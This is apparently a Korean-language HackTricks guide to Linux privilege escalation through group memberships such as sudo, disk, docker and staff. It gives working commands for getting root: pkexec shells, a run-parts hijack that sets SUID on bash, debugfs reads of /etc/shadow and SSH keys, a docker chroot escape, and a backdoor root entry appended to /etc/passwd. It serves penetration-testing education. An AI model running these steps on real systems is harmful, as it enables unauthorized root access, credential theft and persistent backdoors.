# Interesting Groups - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin Groups

### **PE - Method 1**

**때때로**, **기본적으로(또는 일부 software에 필요하기 때문에)** **/etc/sudoers** 파일에서 다음과 같은 줄을 찾을 수 있습니다:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
이는 **sudo 또는 admin 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있음**을 의미합니다.

이 경우 **root가 되려면 다음을 실행하기만 하면 됩니다**:
```
sudo su
```
### PE - 방법 2

모든 suid 바이너리를 찾고 **Pkexec** 바이너리가 있는지 확인합니다:
```bash
find / -perm -4000 2>/dev/null
```
바이너리 **pkexec가 SUID 바이너리**이고 사용자가 **sudo** 또는 **admin** 그룹에 속해 있다면, `pkexec`를 사용하여 sudo로 바이너리를 실행할 수 있을 가능성이 높습니다.\
이는 일반적으로 해당 그룹들이 **polkit policy**에 포함되어 있기 때문입니다. 이 policy는 기본적으로 어떤 그룹이 `pkexec`를 사용할 수 있는지 식별합니다. 다음 명령으로 확인합니다:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
여기에서 **pkexec**를 실행할 수 있는 그룹을 확인할 수 있으며, 일부 Linux 배포판에서는 **기본적으로** **sudo** 및 **admin** 그룹이 표시됩니다.

**root가 되려면 다음을 실행할 수 있습니다**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
**pkexec**를 실행하려고 했는데 다음 **error**가 발생한다면:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**권한이 없어서가 아니라 GUI 없이 연결되어 있지 않기 때문입니다**. 이 문제에 대한 우회 방법은 여기에서 확인할 수 있습니다: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). **서로 다른 2개의 ssh 세션**이 필요합니다:
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel Group

**때때로**, 기본적으로 **/etc/sudoers** 파일에서 다음 줄을 찾을 수 있습니다:
```
%wheel	ALL=(ALL:ALL) ALL
```
이는 **wheel 그룹에 속한 모든 사용자가 sudo로 무엇이든 실행할 수 있음**을 의미합니다.

이 경우 **root가 되려면 다음을 실행하기만 하면 됩니다**:
```
sudo su
```
## Shadow Group

**group shadow**의 사용자는 **/etc/shadow** 파일을 **읽을** 수 있습니다:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
그러므로 파일을 읽고 **일부 hash를 crack**해 보세요.

hash를 분류할 때 알아둘 간단한 lock-state 관련 사항:
- `!` 또는 `*`가 포함된 항목은 일반적으로 password login을 통한 interactive 사용이 불가능합니다.
- `!hash`는 일반적으로 password가 설정된 후 lock되었음을 의미합니다.
- `*`는 일반적으로 유효한 password hash가 설정된 적이 없음을 의미합니다.
이 정보는 direct login이 차단된 경우에도 account classification에 유용합니다.

## Staff 그룹

**staff**: root privilege 없이도 사용자가 시스템(`/usr/local`)에 local modification을 추가할 수 있도록 합니다(`/usr/local/bin`의 executable은 모든 사용자의 PATH variable에 포함되며, 같은 이름의 `/bin` 및 `/usr/bin` executable을 "override"할 수 있다는 점에 유의하세요). monitoring/security와 더 관련이 있는 "adm" group과 비교해 보세요. [\[source\]](https://wiki.debian.org/SystemGroups)

Debian distributions에서는 `$PATH` variable을 통해 privileged user인지 여부와 관계없이 `/usr/local/`이 가장 높은 priority로 실행된다는 것을 확인할 수 있습니다.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
`/usr/local`의 일부 프로그램을 hijack할 수 있다면 쉽게 root 권한을 얻을 수 있습니다.

`run-parts` 프로그램을 hijack하는 것은 쉽게 root 권한을 얻는 방법입니다. 대부분의 프로그램이 `run-parts`를 실행하기 때문입니다(예: crontab, ssh login 시).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
또는 새 ssh 세션에 로그인할 때.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

이 권한은 시스템 내부의 모든 데이터에 액세스할 수 있으므로 **root access와 거의 동등합니다**.

파일:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
debugfs를 사용하면 **파일을 쓸 수도** 있습니다. 예를 들어 `/tmp/asd1.txt`를 `/tmp/asd2.txt`로 복사하려면 다음과 같이 실행할 수 있습니다:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
그러나 **root가 소유한 파일**(예: `/etc/shadow` 또는 `/etc/passwd`)을 **write**하려고 하면 "**Permission denied**" 오류가 발생합니다.

## Video 그룹

`w` 명령을 사용하면 **시스템에 로그인한 사용자**를 확인할 수 있으며, 다음과 같은 출력이 표시됩니다:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1**은 사용자가 **yossi**라는 계정으로 해당 머신의 터미널에 **물리적으로 로그인되어 있음**을 의미합니다.

**video group**은 화면 출력을 볼 수 있는 권한을 가집니다. 기본적으로 화면을 관찰할 수 있습니다. 이를 위해서는 **현재 화면의 이미지를** raw data로 가져오고, 화면이 사용 중인 해상도를 확인해야 합니다. 화면 데이터는 `/dev/fb0`에 저장될 수 있으며, 이 화면의 해상도는 `/sys/class/graphics/fb0/virtual_size`에서 확인할 수 있습니다.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
**raw image**를 **열려면** **GIMP**를 사용할 수 있습니다. **`screen.raw`** 파일을 선택하고 파일 형식으로 **Raw image data**를 선택합니다:

![Disk Group - Video Group: raw image를 열려면 GIMP를 사용하고 screen.raw 파일을 선택한 다음 파일 형식으로 Raw image data를 선택합니다](<../../../images/image (463).png>)

그런 다음 화면에서 사용된 Width와 Height로 변경하고 여러 Image Types를 확인합니다(화면이 가장 잘 표시되는 유형을 선택합니다):

![Disk Group - Video Group: 그런 다음 화면에서 사용된 Width와 Height로 변경하고 여러 Image Types를 확인합니다(화면이 가장 잘 표시되는 유형을 선택합니다)](<../../../images/image (317).png>)

## Root Group

기본적으로 **members of root group**은 일부 **service** configuration files, 일부 **libraries** files 또는 privileges를 escalate하는 데 사용할 수 있는 **other interesting things**를 **modify**할 수 있는 것처럼 보입니다...

**root members가 modify할 수 있는 파일 확인**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

**호스트 머신의 root filesystem을 인스턴스의 볼륨에 mount**할 수 있으므로, 인스턴스가 시작되면 즉시 해당 볼륨으로 `chroot`를 로드합니다. 이를 통해 해당 머신에서 사실상 root 권한을 얻게 됩니다.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
마지막으로, 앞의 제안이 마음에 들지 않거나 어떤 이유로든 작동하지 않는 경우(예: docker api firewall?)에는 언제든지 **privileged container를 실행하고 그 컨테이너에서 escape**를 시도할 수 있습니다. 자세한 내용은 여기에서 설명합니다:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

docker socket에 대한 쓰기 권한이 있다면 [**docker socket을 악용하여 privileges를 escalate하는 방법에 관한 이 글**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**을 읽어보세요.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd 그룹


{{#ref}}
./
{{#endref}}

## Adm 그룹

일반적으로 **`adm`** 그룹의 **멤버**는 _/var/log/_ 내부에 있는 **log** 파일을 **읽을** 권한을 가집니다.\
따라서 이 그룹에 속한 사용자를 compromise했다면 반드시 **log를 확인**해야 합니다.

## Backup / Operator / lp / Mail 그룹

이 그룹들은 직접적인 root vector라기보다는 **credential-discovery** vector인 경우가 많습니다:
- **backup**: configs, keys, DB dumps 또는 tokens가 포함된 archives를 노출할 수 있습니다.
- **operator**: platform에 따라 operational access를 제공하며 민감한 runtime data를 leak할 수 있습니다.
- **lp**: print queues/spools에 document contents가 포함될 수 있습니다.
- **mail**: mail spools를 통해 reset links, OTPs 및 내부 credentials가 노출될 수 있습니다.

이러한 그룹의 멤버십은 중요한 data exposure finding으로 간주하고, password/token reuse를 통해 pivot하세요.

## Auth 그룹

OpenBSD에서 **auth** 그룹은 일반적으로 _**/etc/skey**_ 및 _**/var/db/yubikey**_ 폴더가 사용 중인 경우 해당 폴더에 write할 수 있습니다.\
이러한 permissions는 다음 exploit을 사용하여 root로 **privileges를 escalate**하는 데 악용될 수 있습니다: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
